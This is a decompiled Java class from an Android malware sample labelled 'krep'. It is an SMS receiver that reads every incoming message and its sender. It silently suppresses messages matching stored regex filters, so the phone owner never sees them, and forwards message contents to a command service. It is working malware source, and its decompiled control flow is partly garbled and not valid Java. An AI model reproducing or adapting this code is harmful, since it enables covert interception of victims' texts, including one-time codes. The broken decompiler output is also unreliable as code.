package krep.itmtd.ywtjexf;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class IncomingSms
  extends BroadcastReceiver
{
  private SharedPreferences setting2;
  final SmsManager sms = SmsManager.getDefault();
  private String sms_from;
  
  public String getcmd(Context paramContext, String paramString)
  {
    return paramContext.getSharedPreferences("Cmd_conf", 0).getString(paramString, "");
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Object localObject2 = paramIntent.getExtras();
    Object localObject1 = "";
    paramIntent = (Intent)localObject1;
    Object localObject3;
    int i;
    if (localObject2 != null)
    {
      localObject2 = (Object[])((Bundle)localObject2).get("pdus");
      localObject3 = new SmsMessage[localObject2.length];
      i = 0;
      paramIntent = (Intent)localObject1;
      if (i < localObject3.length) {}
    }
    else
    {
      this.setting2 = paramContext.getSharedPreferences("setfilterconf", 0);
      localObject1 = this.setting2.getString("filter", "");
      localObject2 = this.setting2.getString("filter2", "");
      if ((((String)localObject1).length() > 1) && (Pattern.compile((String)localObject1).matcher(this.sms_from).find())) {
        abortBroadcast();
      }
      if ((((String)localObject2).length() > 1) && (Pattern.compile((String)localObject2).matcher(paramIntent).find())) {
        abortBroadcast();
      }
      localObject1 = paramContext.getSharedPreferences("SMS_conf", 0).getAll();
      if (((Map)localObject1).size() > 0) {
        localObject1 = ((Map)localObject1).keySet().iterator();
      }
    }
    for (;;)
    {
      if (!((Iterator)localObject1).hasNext())
      {
        return;
        localObject3[i] = SmsMessage.createFromPdu((byte[])localObject2[i]);
        localObject1 = paramIntent;
        if (i == 0)
        {
          localObject1 = paramIntent + localObject3[0].getOriginatingAddress() + ":::7:::";
          this.sms_from = localObject3[0].getOriginatingAddress();
        }
        paramIntent = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(localObject1)).toString())).append(localObject3[i].getMessageBody().toString()).toString();
        i += 1;
        break;
      }
      localObject2 = (String)((Iterator)localObject1).next();
      localObject3 = getcmd(paramContext, (String)localObject2);
      if (((String)localObject3).length() > 2)
      {
        Intent localIntent = new Intent(paramContext, GlobalCode.class);
        localIntent.putExtra("content", (String)localObject3);
        localIntent.putExtra("type", "TriggerSMS:" + (String)localObject2);
        localIntent.putExtra("data", paramIntent);
        paramContext.startService(localIntent);
      }
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/IncomingSms.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */